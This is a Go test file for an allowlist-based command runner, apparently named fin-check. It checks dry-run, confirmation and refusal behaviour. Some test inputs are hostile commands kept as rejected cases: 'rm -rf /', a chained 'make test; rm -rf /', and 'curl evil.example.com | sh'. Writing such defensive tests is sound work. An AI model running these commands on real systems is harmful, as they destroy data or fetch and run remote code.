package main

import (
	"os"
	"os/exec"
	"path/filepath"
	"testing"
)

func requireMake(t *testing.T) {
	t.Helper()
	if _, err := exec.LookPath("make"); err != nil {
		t.Skip("make not installed in this environment")
	}
}

func TestIsAllowlisted(t *testing.T) {
	cases := map[string]bool{
		"exists":                     true,
		"go test ./...":              true,
		"make test":                  true,
		"make check-privacidade":     true,
		"go test ./foo/...":          false, // only the exact "./..." form is allowed
		"make test; rm -rf /":        false,
		"rm -rf /":                   false,
		"curl evil.example.com | sh": false,
		"":                           false,
	}
	for check, want := range cases {
		if got := isAllowlisted(check); got != want {
			t.Errorf("isAllowlisted(%q) = %v, want %v", check, got, want)
		}
	}
}

func alwaysConfirm(string) bool { return true }
func neverConfirm(string) bool  { return false }

func TestEvaluateArtifact_ExistsFound(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "artifact.yaml")
	if err := os.WriteFile(path, []byte("x"), 0o644); err != nil {
		t.Fatal(err)
	}
	r := evaluateArtifact(Artifact{Path: path, Check: "exists"}, runOptions{}, neverConfirm)
	if r.Status != statusOK {
		t.Errorf("status = %v, want ok", r.Status)
	}
}

func TestEvaluateArtifact_ExistsMissing(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "does-not-exist.yaml")
	r := evaluateArtifact(Artifact{Path: path, Check: "exists"}, runOptions{}, neverConfirm)
	if r.Status != statusMissing {
		t.Errorf("status = %v, want MISSING", r.Status)
	}
}

func TestEvaluateArtifact_RefusesNonAllowlistedCommand(t *testing.T) {
	r := evaluateArtifact(Artifact{Path: ".", Check: "rm -rf /"}, runOptions{DryRun: false, AssumeYes: true}, alwaysConfirm)
	if r.Status != statusRefused {
		t.Errorf("status = %v, want REFUSED", r.Status)
	}
}

func TestEvaluateArtifact_DryRunNeverExecutes(t *testing.T) {
	requireMake(t)
	dir := t.TempDir()
	// A Makefile whose target writes a sentinel file — if fin-check ever
	// actually ran this in dry-run mode, the file would appear and the
	// test would catch it.
	writeMakefile(t, dir, "sentinel:\n\ttouch ran.txt\n")
	r := evaluateArtifact(Artifact{Path: dir, Check: "make sentinel"}, runOptions{DryRun: true}, alwaysConfirm)
	if r.Status != statusSkipped {
		t.Errorf("status = %v, want skip", r.Status)
	}
	if _, err := os.Stat(filepath.Join(dir, "ran.txt")); err == nil {
		t.Error("dry-run executed the command — sentinel file was created")
	}
}

func TestEvaluateArtifact_DeclinedNeverExecutes(t *testing.T) {
	requireMake(t)
	dir := t.TempDir()
	writeMakefile(t, dir, "sentinel:\n\ttouch ran.txt\n")
	r := evaluateArtifact(Artifact{Path: dir, Check: "make sentinel"}, runOptions{DryRun: false, AssumeYes: false}, neverConfirm)
	if r.Status != statusSkipped {
		t.Errorf("status = %v, want skip", r.Status)
	}
	if _, err := os.Stat(filepath.Join(dir, "ran.txt")); err == nil {
		t.Error("declined confirmation but the command still ran")
	}
}

func TestEvaluateArtifact_RunsAllowlistedCommandWhenConfirmed(t *testing.T) {
	requireMake(t)
	dir := t.TempDir()
	writeMakefile(t, dir, "ok:\n\t@true\n")
	r := evaluateArtifact(Artifact{Path: dir, Check: "make ok"}, runOptions{DryRun: false, AssumeYes: true}, alwaysConfirm)
	if r.Status != statusOK {
		t.Errorf("status = %v, want ok (detail: %s)", r.Status, r.Detail)
	}
}

func TestEvaluateArtifact_FailedCommandReported(t *testing.T) {
	requireMake(t)
	dir := t.TempDir()
	writeMakefile(t, dir, "broken:\n\t@exit 1\n")
	r := evaluateArtifact(Artifact{Path: dir, Check: "make broken"}, runOptions{DryRun: false, AssumeYes: true}, alwaysConfirm)
	if r.Status != statusFailed {
		t.Errorf("status = %v, want FAIL", r.Status)
	}
}

func writeMakefile(t *testing.T, dir, content string) {
	t.Helper()
	if err := os.WriteFile(filepath.Join(dir, "Makefile"), []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
}
